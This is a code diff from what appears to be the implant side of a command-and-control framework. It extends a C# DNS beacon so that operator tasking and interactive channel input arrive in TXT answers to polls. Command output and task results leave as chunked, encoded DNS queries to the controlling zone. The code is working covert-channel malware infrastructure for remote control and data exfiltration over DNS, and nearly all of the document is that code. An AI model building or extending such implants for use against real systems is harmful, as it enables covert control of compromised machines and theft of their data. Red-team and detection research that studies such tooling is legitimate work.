@@ -65,9 +65,13 @@ internal sealed class DnsBeacon : ICheckInClient
 
     // The shared task-acceptance pipeline (fronting gate, verification,
     // dedup, staged/channel/inline shapes) over this client's per-run
-    // state. The poll-carrier refusal of channels lives inside it
-    // (isPoll), the same shape the envelope cycle applies.
+    // state.
     private readonly BeaconTasking _tasking;
+
+    // The store-and-forward channel carriage (PollChannels): the DNS
+    // carrier's own -- input arrives on the polls' TXT answers, output
+    // chunks up as c. queries, all at the poll cadence.
+    private readonly PollChannels _poll;
 
     public DnsBeacon(
         EgressEndpoints egress,
@@ -92,6 +96,7 @@ internal sealed class DnsBeacon : ICheckInClient
         _cadence = cadence;
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
+        _poll = new PollChannels(_held, log);
         _tasking = new BeaconTasking(
             _implantId, _cas, enroll?.Fronted, _nonces, _held,
             HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers), _log);
@@ -100,6 +105,19 @@ internal sealed class DnsBeacon : ICheckInClient
     public bool Serves(string beaconUrl) => BeaconUrl.IsDns(beaconUrl);
 
     public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    {
+        try
+        {
+            return await RunCyclesAsync(cancellationToken);
+        }
+        finally
+        {
+            // The run is ending: the poll carriage's channels end with it.
+            await _poll.DisposeAsync();
+        }
+    }
+
+    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
     {
         // Results whose delivery died with an earlier carrier ride this one
         // first (the dispatch strand): the server reassembles chunks and
@@ -166,33 +184,137 @@ internal sealed class DnsBeacon : ICheckInClient
         var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
         var answer = await DnsDial.QueryAsync(
             _egress.CurrentBeaconUrl, DnsNames.PollName(_implantId, zone), _cas, cancellationToken);
-        if (answer is null)
+        if (answer is null || answer.Length == 0)
+        {
+            await FlushPollBatchAsync(cancellationToken);
             return true; // a quiet poll: presence refreshed, no tasking
+        }
 
-        var task = TaskRequest.Parser.ParseFrom(answer);
+        // The answer's kind byte names its frame: a task to run, or parked
+        // channel input to route -- the input answer carries every frame
+        // the drain collected, each length-prefixed (a typing burst and its
+        // eof arrive together; one frame per poll would strand the tail of
+        // a park the server already emptied).
+        if (answer[0] == (byte)'i')
+        {
+            var offset = 1;
+            while (offset < answer.Length)
+            {
+                var (length, consumed) = ReadVarint(answer, offset);
+                offset += consumed;
+                if (length > (ulong)(answer.Length - offset))
+                    break; // a truncated tail: drop it, the retransmit re-sends
+                var input = ChannelInput.Parser.ParseFrom(answer.AsSpan(offset, (int)length).ToArray());
+                _log.WriteLine($"dns poll carried input: task {input.TaskId} {input.Data.Length}B eof={input.Eof}");
+                _poll.RouteInput(new Frame
+                {
+                    Kind = FrameKind.ChannelInput,
+                    Payload = ByteString.CopyFrom(input.ToByteArray()),
+                });
+                offset += (int)length;
+            }
+            await FlushPollBatchAsync(cancellationToken);
+            return true;
+        }
+        if (answer[0] != (byte)'t')
+        {
+            await FlushPollBatchAsync(cancellationToken);
+            return true; // an unknown kind: treated as a quiet poll
+        }
+
+        var task = TaskRequest.Parser.ParseFrom(answer.AsSpan(1).ToArray());
         _log.WriteLine($"dns poll carried task {task.TaskId} ({task.Verb})");
         await _tasking.AcceptAsync(
             task,
-            isPoll: true,
             WriteFrameAsync,
             RunStagedRefusedAsync,
-            static (_, _) => { },
+            // The store-and-forward carriage: the channel handler runs in the
+            // background, its output batching into the poll batch (flushed as
+            // c. chunks below), its input arriving on later polls' answers.
+            (started, handler) => _poll.StartChannel(started, handler),
             cancellationToken);
+        await FlushPollBatchAsync(cancellationToken);
         return true;
+    }
+
+    // Flushes the store-and-forward batch the run accumulated -- channel
+    // output frames chunk up as c. queries, final TaskResults as r. queries
+    // (the QueueResult discipline already routes them into the batch). The
+    // delivered frames clear only after the queries were sent; a lost cycle
+    // re-sends (the transcript append is the straggler the ingest path
+    // ignores, the result record first-wins).
+    private async Task FlushPollBatchAsync(CancellationToken cancellationToken)
+    {
+        var pending = _poll.SnapshotPending();
+        foreach (var frame in pending)
+        {
+            if (frame.Kind == FrameKind.ChannelOutput)
+            {
+                var output = ChannelOutput.Parser.ParseFrom(frame.Payload);
+                await ReportChannelAsync(output.TaskId, output.Data.ToByteArray(), cancellationToken);
+            }
+            else if (frame.Kind == FrameKind.TaskResult)
+            {
+                var result = TaskResult.Parser.ParseFrom(frame.Payload);
+                await ReportAsync(result.TaskId, result.Outcome, result.Output, cancellationToken);
+            }
+            // Ack and demand frames have no DNS carriage: the server's poll
+            // path keeps no ack ledger and answers demands on the stream
+            // carriers -- neither applies here.
+        }
+        _poll.MarkDelivered(pending);
+    }
+
+    /// <summary>
+    /// Reports one channel-output chunk sequence as c. queries under the
+    /// current dial's zone: the marshaled ChannelOutput message chunks
+    /// 0-origin with a terminal flag, mirroring the result path's shape.
+    /// </summary>
+    private async Task ReportChannelAsync(
+        string taskId, byte[] data, CancellationToken cancellationToken)
+    {
+        var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
+        var chunks = (data.Length + ChunkBytes - 1) / ChunkBytes;
+        for (var index = 0; index < Math.Max(chunks, 1); index++)
+        {
+            var take = Math.Min(ChunkBytes, data.Length - index * ChunkBytes);
+            var chunk = new byte[Math.Max(take, 0)];
+            if (take > 0)
+                Array.Copy(data, index * ChunkBytes, chunk, 0, take);
+            var terminal = index == Math.Max(chunks, 1) - 1;
+            var name = DnsNames.ChannelName(_implantId, taskId, index, terminal, chunk, zone);
+            await DnsDial.QueryAsync(_egress.CurrentBeaconUrl, name, _cas, cancellationToken, queryOnly: true);
+        }
+        _log.WriteLine($"dns channel output reported: task {taskId} {data.Length}B in {Math.Max(chunks, 1)} chunk(s)");
     }
 
     // Staged transfers ride a stream carrier's channel machinery; the DNS
     // budget carries short tasking only, so the demand is refused on the
-    // task itself (the server's claim gate already holds channel verbs off
-    // this carrier; this is the client-side belt for anything that slips).
+    // task itself (the server's claim gate holds oversized tasking off this
+    // carrier; this is the client-side belt for anything that slips).
     private static Task<(TaskOutcome Outcome, string Output)> RunStagedRefusedAsync(
         TaskRequest staged, CancellationToken cancellationToken) =>
         Task.FromResult((
             TaskOutcome.Failed,
             $"{staged.Verb} rides a stream transport; the DNS carrier carries short tasking only"));
 
-    // The write adapter: results ride as chunked TXT queries; the ack and
-    // channel frames have no DNS carriage (results are idempotent
+    // Reads one LEB128 varint off the buffer: the value and its byte width.
+    private static (ulong Value, int Bytes) ReadVarint(byte[] source, int offset)
+    {
+        ulong value = 0;
+        var shift = 0;
+        for (var consumed = 0; consumed < 5 && offset + consumed < source.Length; consumed++)
+        {
+            var b = source[offset + consumed];
+            value |= (ulong)(b & 0x7f) << shift;
+            if ((b & 0x80) == 0)
+                return (value, consumed + 1);
+            shift += 7;
+        }
+        return (0, 0);
+    }
+
+    // The write adapter: results ride as chunked TXT queries (idempotent
     // server-side, retransmission-safe by the first-wins record).
     private async Task WriteFrameAsync(Frame frame, CancellationToken cancellationToken)
     {
@@ -546,10 +668,41 @@ internal static class DnsNames
     public static string PollName(string implantId, string zone)
         => $"p.{Encode(implantId)}.{zone}";
 
+    /// <summary>
+    /// Renders an enrollment-upload chunk name (the implant-side twin of
+    /// the teamserver's parser): e.&lt;stream&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.
+    /// </summary>
+    public static string EnrollName(byte[] stream, int sequence, bool terminal, byte[] chunk, string zone)
+        => "e." + Encode(stream)
+            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
+            + "." + (terminal ? "t" : "m")
+            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
+            + "." + zone;
+
+    /// <summary>Renders an enrollment-answer probe name.</summary>
+    public static string EnrollAnswerName(byte[] token, int sequence, string zone)
+        => "a." + Encode(token)
+            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
+            + "." + zone;
+
     public static string ResultName(
         string implantId, string taskId, bool succeeded, int sequence, bool terminal, byte[] chunk, string zone)
         => "r." + Encode(taskId)
             + "." + (succeeded ? "s" : "f")
+            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
+            + "." + (terminal ? "t" : "m")
+            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
+            + "." + Encode(implantId)
+            + "." + zone;
+
+    /// <summary>
+    /// Renders a channel-output chunk name (the implant-side twin of the
+    /// teamserver's parser):
+    /// c.&lt;task&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.&lt;implant&gt;.
+    /// </summary>
+    public static string ChannelName(
+        string implantId, string taskId, int sequence, bool terminal, byte[] chunk, string zone)
+        => "c." + Encode(taskId)
             + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
             + "." + (terminal ? "t" : "m")
             + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
